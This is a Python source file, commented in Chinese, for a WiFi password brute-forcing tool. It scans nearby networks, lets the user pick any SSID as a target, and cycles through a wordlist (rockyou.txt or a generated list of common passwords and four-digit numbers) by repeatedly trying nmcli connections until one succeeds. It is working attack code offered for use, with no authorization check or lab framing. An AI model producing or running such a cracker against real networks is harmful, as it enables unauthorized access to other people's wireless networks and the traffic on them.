#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WiFi密码爆破工具
支持现有网络连接的密码字典攻击
"""

import os
import sys
import time
import argparse
import subprocess
import threading
import signal
import nmap
import socket
import requests
from datetime import datetime

class WiFiPasswordCracker:
    def __init__(self):
        self.running = False
        self.wordlist_file = None
        self.target_ssid = None
        self.target_ip = None
        self.target_port = None
        self.found_password = None
        self.attempts = 0
        self.start_time = None
        self.current_connection = None
        
    def check_root(self):
        """检查是否具有root权限"""
        if os.geteuid() != 0:
            print("[!] 需要root权限运行此工具")
            sys.exit(1)
    
    def check_dependencies(self):
        """检查必要的依赖工具"""
        required_modules = ['nmap', 'requests']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"[!] 缺少必要的Python模块: {', '.join(missing_modules)}")
            print("[*] 请安装: pip install python-nmap requests")
            sys.exit(1)
        
        print("[+] 所有依赖模块已安装")
    
    def get_current_connection(self):
        """获取当前网络连接信息"""
        try:
            # 获取当前连接的SSID
            result = subprocess.run(['iwgetid', '-r'], capture_output=True, text=True)
            if result.returncode == 0 and result.stdout.strip():
                ssid = result.stdout.strip()
                print(f"[+] 当前连接的WiFi: {ssid}")
                return ssid
            else:
                print("[!] 未检测到WiFi连接")
                return None
        except Exception as e:
            print(f"[*] 获取当前连接失败: {e}")
            return None
    
    def scan_available_networks(self):
        """扫描可用的WiFi网络"""
        print("[*] 正在扫描附近的WiFi网络...")
        
        networks = []
        scan_methods = []
        
        # 检查可用的扫描工具
        tools = ['nmcli', 'iwlist', 'iw']
        available_tools = []
        
        for tool in tools:
            try:
                result = subprocess.run(['which', tool], capture_output=True, text=True)
                if result.returncode == 0:
                    available_tools.append(tool)
            except:
                pass
        
        print(f"[*] 可用的扫描工具: {', '.join(available_tools) if available_tools else '无'}")
        
        # 方法1: 使用nmcli扫描 (最可靠)
        if 'nmcli' in available_tools:
            try:
                print("[*] 使用nmcli扫描...")
                result = subprocess.run(['nmcli', '-f', 'SSID,SECURITY,SIGNAL', 'dev', 'wifi'], 
                                      capture_output=True, text=True, timeout=30)
                
                if result.returncode == 0 and result.stdout.strip():
                    lines = result.stdout.split('\n')
                    
                    for line in lines:
                        line = line.strip()
                        if line and not line.startswith('SSID') and '--' not in line:
                            # 处理格式: SSID SECURITY SIGNAL
                            parts = line.split(maxsplit=2)
                            if len(parts) >= 3:
                                ssid = parts[0]
                                security = parts[1] if parts[1] != '--' else 'Unknown'
                                signal = parts[2].split()[0] if parts[2].split() else 'Unknown'
                                
                                if ssid and ssid != '--':
                                    networks.append({
                                        'ssid': ssid,
                                        'security': security,
                                        'signal': signal
                                    })
                    
                    if networks:
                        print(f"[+] nmcli扫描发现 {len(networks)} 个网络")
                        scan_methods.append('nmcli')
                else:
                    print("[*] nmcli扫描无结果")
                    
            except subprocess.TimeoutExpired:
                print("[!] nmcli扫描超时")
            except Exception as e:
                print(f"[*] nmcli扫描失败: {e}")
        
        # 方法2: 使用iwlist扫描
        if 'iwlist' in available_tools:
            try:
                print("[*] 使用iwlist扫描...")
                
                # 先启用WiFi接口
                interfaces = self.get_wifi_interfaces()
                if interfaces:
                    interface = interfaces[0]
                    
                    # 启用接口
                    subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    # 使用正确的iwlist命令格式
                    result = subprocess.run(['iwlist', interface, 'scan'], 
                                          capture_output=True, text=True, timeout=45)
                    
                    if result.returncode == 0 and result.stdout.strip():
                        current_cell = {}
                        lines = result.stdout.split('\n')
                        
                        for line in lines:
                            line = line.strip()
                            
                            if 'Cell' in line and 'Address:' in line and current_cell:
                                # 保存上一个网络
                                if 'ssid' in current_cell:
                                    networks.append(current_cell)
                                current_cell = {}
                            
                            elif 'ESSID:' in line:
                                ssid_part = line.split('ESSID:')
                                if len(ssid_part) > 1:
                                    ssid = ssid_part[1].strip().strip('"')
                                    if ssid and ssid != '\x00':  # 过滤无效SSID
                                        current_cell['ssid'] = ssid
                            
                            elif 'Encryption key:' in line:
                                encryption = line.split('Encryption key:')[1].strip()
                                current_cell['security'] = '加密' if encryption == 'on' else '开放'
                            
                            elif 'Signal level=' in line:
                                signal_parts = line.split('Signal level=')
                                if len(signal_parts) > 1:
                                    signal_value = signal_parts[1].split()[0]
                                    current_cell['signal'] = signal_value
                        
                        # 保存最后一个网络
                        if 'ssid' in current_cell:
                            networks.append(current_cell)
                        
                        if networks:
                            print(f"[+] iwlist扫描发现 {len(networks)} 个网络")
                            scan_methods.append('iwlist')
                    else:
                        print(f"[*] iwlist扫描无结果: {result.stderr if result.stderr else '无输出'}")
                        
            except subprocess.TimeoutExpired:
                print("[!] iwlist扫描超时")
            except Exception as e:
                print(f"[*] iwlist扫描失败: {e}")
        
        # 方法3: 使用iw扫描 (较新的工具)
        if 'iw' in available_tools:
            try:
                print("[*] 使用iw扫描...")
                
                # 先获取接口
                interfaces = self.get_wifi_interfaces()
                if interfaces:
                    interface = interfaces[0]
                    
                    # 启用接口
                    subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    # 使用正确的iw扫描命令
                    result = subprocess.run(['iw', interface, 'scan'], 
                                          capture_output=True, text=True, timeout=45)
                    
                    if result.returncode == 0 and result.stdout.strip():
                        lines = result.stdout.split('\n')
                        current_bss = {}
                        
                        for line in lines:
                            line = line.strip()
                            
                            if 'BSS' in line and current_bss:
                                if 'ssid' in current_bss:
                                    networks.append(current_bss)
                                current_bss = {}
                            
                            elif 'SSID:' in line:
                                ssid = line.split('SSID:')[1].strip()
                                if ssid:
                                    current_bss['ssid'] = ssid
                            
                            elif 'signal:' in line:
                                signal = line.split('signal:')[1].strip().split()[0]
                                current_bss['signal'] = signal
                            
                            elif 'WPA:' in line:
                                current_bss['security'] = 'WPA'
                            elif 'WEP:' in line:
                                current_bss['security'] = 'WEP'
                            elif 'RSN:' in line:
                                current_bss['security'] = 'WPA2'
                        
                        # 保存最后一个网络
                        if 'ssid' in current_bss:
                            networks.append(current_bss)
                        
                        if networks:
                            print(f"[+] iw扫描发现 {len(networks)} 个网络")
                            scan_methods.append('iw')
                    else:
                        print(f"[*] iw扫描无结果: {result.stderr if result.stderr else '无输出'}")
                
            except subprocess.TimeoutExpired:
                print("[!] iw扫描超时")
            except Exception as e:
                print(f"[*] iw扫描失败: {e}")
        
        # 方法4: 检查已知的连接历史 (如果nmcli可用)
        if 'nmcli' in available_tools and not networks:
            try:
                print("[*] 检查连接历史...")
                result = subprocess.run(['nmcli', '-t', '-f', 'NAME,TYPE', 'con', 'show'], 
                                      capture_output=True, text=True)
                
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if line.strip() and '802-11-wireless' in line:
                            parts = line.split(':')
                            if len(parts) >= 2:
                                ssid = parts[0]
                                networks.append({
                                    'ssid': ssid,
                                    'security': '历史记录',
                                    'signal': 'N/A'
                                })
                    
                    if networks:
                        print(f"[+] 从历史记录找到 {len(networks)} 个网络")
                        scan_methods.append('history')
                
            except Exception as e:
                print(f"[*] 连接历史检查失败: {e}")
        
        # 方法5: 检查wpa_supplicant配置
        if not networks:
            try:
                print("[*] 检查wpa_supplicant配置...")
                config_files = [
                    '/etc/wpa_supplicant/wpa_supplicant.conf',
                    '/etc/wpa_supplicant.conf',
                    os.path.expanduser('~/.wpa_supplicant.conf')
                ]
                
                for config_file in config_files:
                    if os.path.exists(config_file):
                        with open(config_file, 'r') as f:
                            content = f.read()
                            # 查找SSID
                            import re
                            ssids = re.findall(r'ssid=\"(.*?)\"', content)
                            for ssid in ssids:
                                networks.append({
                                    'ssid': ssid,
                                    'security': '配置记录',
                                    'signal': 'N/A'
                                })
                        
                        if networks:
                            print(f"[+] 从配置找到 {len(networks)} 个网络")
                            scan_methods.append('wpa_config')
                            break
            except Exception as e:
                print(f"[*] wpa_supplicant检查失败: {e}")
        
        # 方法6: 手动输入网络
        if not networks:
            print("[*] 无法自动扫描到网络，请手动输入目标WiFi名称:")
            try:
                ssid = input("请输入WiFi名称 (SSID): ").strip()
                if ssid:
                    networks.append({
                        'ssid': ssid,
                        'security': '手动输入',
                        'signal': 'N/A'
                    })
                    scan_methods.append('manual')
            except KeyboardInterrupt:
                print("\n[*] 用户取消输入")
            except Exception as e:
                print(f"[*] 输入失败: {e}")
        
        # 去重
        unique_networks = []
        seen_ssids = set()
        
        for net in networks:
            if net['ssid'] not in seen_ssids:
                unique_networks.append(net)
                seen_ssids.add(net['ssid'])
        
        networks = unique_networks
        
        if not networks:
            print("[!] 未发现任何WiFi网络")
            print("[*] 建议检查:")
            print("    - WiFi硬件开关是否打开")
            print("    - 无线网卡驱动是否正常")
            print("    - 是否在可接收信号的范围内")
            print("    - 尝试: sudo ip link set wlan0 up")
        else:
            print(f"[+] 总共发现 {len(networks)} 个唯一网络 (使用工具: {', '.join(scan_methods)})")
        
        return networks
    
    def test_wifi_password(self, ssid, password):
        """测试WiFi密码是否正确"""
        try:
            # 获取可用的WiFi接口
            interfaces = self.get_wifi_interfaces()
            if not interfaces:
                print("[!] 没有可用的WiFi接口")
                return False
            
            interface = interfaces[0]  # 使用第一个可用接口
            
            # 首先断开当前连接（如果已连接）
            subprocess.run(['nmcli', 'dev', 'disconnect', interface], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # 尝试连接
            cmd = ['nmcli', 'dev', 'wifi', 'connect', ssid, 'password', password]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            
            # 检查连接状态
            if result.returncode == 0:
                # 验证连接是否成功
                time.sleep(3)
                status_result = subprocess.run(['nmcli', '-t', '-f', 'GENERAL.STATE', 'dev', 'show', interface], 
                                             capture_output=True, text=True)
                
                if status_result.returncode == 0 and 'connected' in status_result.stdout:
                    print(f"[+] 密码正确! SSID: {ssid}, 密码: {password}")
                    return True
            
            return False
                
        except subprocess.TimeoutExpired:
            return False
        except Exception as e:
            return False
    
    def get_wifi_interfaces(self):
        """获取可用的WiFi接口"""
        interfaces = []
        
        # 方法1: 使用ip link命令 (最可靠)
        try:
            result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'wlan' in line or 'wlp' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            iface = parts[1].strip()
                            # 检查接口状态
                            if 'state UP' in line or 'state UNKNOWN' in line:
                                interfaces.append(iface)
        except Exception as e:
            print(f"[*] ip link方法失败: {e}")
        
        # 方法2: 检查/sys/class/net目录
        if not interfaces:
            try:
                net_dir = '/sys/class/net'
                if os.path.exists(net_dir):
                    for item in os.listdir(net_dir):
                        if item.startswith(('wlan', 'wlp')):
                            # 检查接口是否可用
                            operstate_file = os.path.join(net_dir, item, 'operstate')
                            if os.path.exists(operstate_file):
                                with open(operstate_file, 'r') as f:
                                    state = f.read().strip()
                                    if state in ['up', 'unknown']:
                                        interfaces.append(item)
            except Exception as e:
                print(f"[*] sysfs方法失败: {e}")
        
        # 方法3: 使用iw命令
        if not interfaces:
            try:
                result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
                if result.returncode == 0:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        line = line.strip()
                        if line.startswith('Interface'):
                            iface = line.split()[1]
                            interfaces.append(iface)
            except Exception as e:
                print(f"[*] iw方法失败: {e}")
        
        # 方法4: 使用iwconfig
        if not interfaces:
            try:
                result = subprocess.run(['iwconfig'], capture_output=True, text=True)
                if result.returncode == 0:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if 'IEEE 802.11' in line and 'no wireless extensions' not in line:
                            iface = line.split()[0]
                            interfaces.append(iface)
            except Exception as e:
                print(f"[*] iwconfig方法失败: {e}")
        
        # 去重和排序
        interfaces = sorted(list(set(interfaces)))
        
        if interfaces:
            print(f"[+] 发现 {len(interfaces)} 个WiFi接口: {', '.join(interfaces)}")
            
            # 检查接口状态
            for iface in interfaces:
                try:
                    result = subprocess.run(['ip', 'link', 'show', iface], capture_output=True, text=True)
                    if result.returncode == 0:
                        if 'state UP' in result.stdout:
                            print(f"    {iface}: 已启用")
                        elif 'state DOWN' in result.stdout:
                            print(f"    {iface}: 未启用 (尝试: sudo ip link set {iface} up)")
                        else:
                            print(f"    {iface}: 未知状态")
                except:
                    pass
        else:
            print("[!] 未发现可用的WiFi接口")
            print("[*] 可能的原因:")
            print("    - 无线网卡未插入或损坏")
            print("    - 缺少驱动程序")
            print("    - 硬件开关未打开")
        
        return interfaces
    
    def crack_password(self, ssid, wordlist_file):
        """使用字典破解密码"""
        print(f"[*] 开始破解 {ssid} 的密码...")
        print(f"[*] 字典文件: {wordlist_file}")
        
        if not os.path.exists(wordlist_file):
            print("[!] 字典文件不存在")
            return False
        
        self.start_time = datetime.now()
        self.attempts = 0
        
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = f.readlines()
            
            print(f"[*] 加载了 {len(passwords)} 个密码")
            
            for password in passwords:
                password = password.strip()
                if not password:
                    continue
                
                self.attempts += 1
                
                # 显示进度
                if self.attempts % 10 == 0:
                    elapsed = datetime.now() - self.start_time
                    elapsed_seconds = elapsed.total_seconds()
                    speed = self.attempts / elapsed_seconds if elapsed_seconds > 0 else 0
                    print(f"[*] 已尝试 {self.attempts}/{len(passwords)} 个密码，速度: {speed:.1f} 密码/秒")
                
                # 测试密码
                if self.test_wifi_password(ssid, password):
                    self.found_password = password
                    print(f"\n[+] 密码破解成功!")
                    print(f"[+] SSID: {ssid}")
                    print(f"[+] 密码: {password}")
                    return True
                
                # 防止过于频繁的连接尝试
                time.sleep(1)
            
            print("[!] 密码破解完成，但未找到密码")
            return False
            
        except Exception as e:
            print(f"[!] 密码破解错误: {e}")
            return False
    
    def generate_wordlist(self, base_words=None):
        """生成简单的字典文件"""
        if not base_words:
            base_words = [
                'password', '123456', 'admin', 'wifi', 'password123',
                '12345678', 'qwerty', '123456789', '12345', '1234',
                '111111', '1234567', 'dragon', '123123', 'baseball',
                'abc123', 'football', 'monkey', 'letmein', '696969',
                '000000', '1234567890', '888888', 'admin123', 'password1'
            ]
        
        wordlist_file = f"/tmp/wordlist_{int(time.time())}.txt"
        
        try:
            with open(wordlist_file, 'w') as f:
                # 基础单词
                for word in base_words:
                    f.write(word + '\n')
                
                # 数字组合
                for i in range(1000, 10000):
                    f.write(str(i) + '\n')
                
                # 简单模式
                for word in base_words:
                    f.write(word + '123\n')
                    f.write(word + '1234\n')
                    f.write(word + '12345\n')
                    f.write(word + '@123\n')
                    f.write(word.upper() + '\n')
            
            print(f"[+] 生成字典文件: {wordlist_file} ({len(base_words) + 9000 + len(base_words)*5} 个密码)")
            return wordlist_file
            
        except Exception as e:
            print(f"[!] 生成字典文件失败: {e}")
            return None
    
    def show_statistics(self):
        """显示统计信息"""
        if self.start_time:
            elapsed = datetime.now() - self.start_time
            elapsed_seconds = elapsed.total_seconds()
            
            print("\n=== 统计信息 ===")
            print(f"尝试次数: {self.attempts}")
            print(f"耗时: {int(elapsed_seconds // 60)}分{int(elapsed_seconds % 60)}秒")
            
            if elapsed_seconds > 0:
                speed = self.attempts / elapsed_seconds
                print(f"平均速度: {speed:.2f} 密码/秒")
            
            if self.found_password:
                print(f"找到的密码: {self.found_password}")
            else:
                print("密码: 未找到")
    
    def interactive_mode(self):
        """交互模式"""
        print("\n=== WiFi密码爆破工具 ===")
        
        # 检查依赖
        self.check_dependencies()
        
        # 获取当前连接
        current_ssid = self.get_current_connection()
        
        # 扫描可用网络
        networks = self.scan_available_networks()
        
        if not networks:
            print("[!] 未发现WiFi网络")
            return
        
        print("\n[+] 发现的WiFi网络:")
        print("序号 | SSID              | 安全模式    | 信号强度")
        print("-" * 50)
        
        for i, net in enumerate(networks):
            ssid = net.get('ssid', 'Unknown')
            security = net.get('security', 'Unknown')
            signal_strength = net.get('signal', 'N/A')
            print(f"{i+1:2d}  | {ssid:16s} | {security:10s} | {signal_strength}")
        
        # 选择目标网络
        while True:
            try:
                choice = input(f"\n选择目标网络 (1-{len(networks)}) 或输入当前网络SSID: ").strip()
                
                if choice.isdigit() and 1 <= int(choice) <= len(networks):
                    target = networks[int(choice) - 1]
                    self.target_ssid = target['ssid']
                    break
                elif choice:
                    # 检查是否是有效的SSID
                    if any(net['ssid'] == choice for net in networks):
                        self.target_ssid = choice
                        break
                    else:
                        print("[!] 无效的SSID，请重新选择")
                else:
                    print("[!] 请输入选择")
                    
            except KeyboardInterrupt:
                return
        
        # 选择字典文件
        print("\n选择字典文件:")
        print("1. 使用系统字典 (/usr/share/wordlists/)")
        print("2. 使用自定义字典文件")
        print("3. 生成简单字典")
        
        while True:
            try:
                choice = input("选择 (1-3): ").strip()
                
                if choice == '1':
                    # 查找系统字典
                    common_wordlists = [
                        '/usr/share/wordlists/rockyou.txt',
                        '/usr/share/wordlists/rockyou.txt.gz',
                        '/usr/share/dict/words'
                    ]
                    
                    for wordlist in common_wordlists:
                        if os.path.exists(wordlist):
                            self.wordlist_file = wordlist
                            print(f"[+] 使用系统字典: {wordlist}")
                            break
                    
                    if not self.wordlist_file:
                        print("[!] 未找到系统字典，使用生成的字典")
                        self.wordlist_file = self.generate_wordlist()
                
                elif choice == '2':
                    wordlist_path = input("输入字典文件路径: ").strip()
                    if os.path.exists(wordlist_path):
                        self.wordlist_file = wordlist_path
                    else:
                        print("[!] 文件不存在，使用生成的字典")
                        self.wordlist_file = self.generate_wordlist()
                
                elif choice == '3':
                    self.wordlist_file = self.generate_wordlist()
                
                else:
                    print("无效选择")
                    continue
                
                if self.wordlist_file:
                    break
                    
            except KeyboardInterrupt:
                return
        
        # 开始破解
        print(f"\n[*] 开始破解 {self.target_ssid} 的密码...")
        print("[*] 注意: 此过程会频繁尝试连接，请确保设备支持快速重连")
        
        success = self.crack_password(self.target_ssid, self.wordlist_file)
        
        # 显示统计信息
        self.show_statistics()
        
        # 清理
        try:
            if self.wordlist_file and '/tmp/wordlist_' in self.wordlist_file:
                os.remove(self.wordlist_file)
        except:
            pass

def signal_handler(signum, frame):
    """信号处理函数"""
    print("\n[*] 收到中断信号，正在停止...")
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description='WiFi密码爆破工具')
    parser.add_argument('-s', '--ssid', help='目标WiFi的SSID')
    parser.add_argument('-w', '--wordlist', help='字典文件路径')
    parser.add_argument('--scan-only', action='store_true', help='仅扫描网络')
    
    args = parser.parse_args()
    
    cracker = WiFiPasswordCracker()
    
    # 检查权限
    cracker.check_root()
    
    # 注册信号处理
    signal.signal(signal.SIGINT, signal_handler)
    
    # 检查依赖
    cracker.check_dependencies()
    
    # 扫描模式
    if args.scan_only:
        networks = cracker.scan_available_networks()
        if networks:
            print("\n发现的WiFi网络:")
            for net in networks:
                ssid = net.get('ssid', 'Unknown')
                security = net.get('security', 'Unknown')
                signal_strength = net.get('signal', 'N/A')
                print(f"SSID: {ssid}, 安全: {security}, 信号: {signal_strength}")
        return
    
    # 命令行模式
    if args.ssid:
        # 使用指定字典或生成字典
        if args.wordlist and os.path.exists(args.wordlist):
            wordlist_file = args.wordlist
        else:
            wordlist_file = cracker.generate_wordlist()
        
        # 破解密码
        cracker.crack_password(args.ssid, wordlist_file)
        cracker.show_statistics()
    else:
        # 交互模式
        cracker.interactive_mode()

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════╗
    ║           WiFi密码爆破工具             ║
    ║       无需监听模式的连接测试方法       ║
    ╚═══════════════════════════════════════╝
    """)
    
    if len(sys.argv) == 1:
        # 交互模式
        cracker = WiFiPasswordCracker()
        cracker.interactive_mode()
    else:
        # 命令行模式
        main()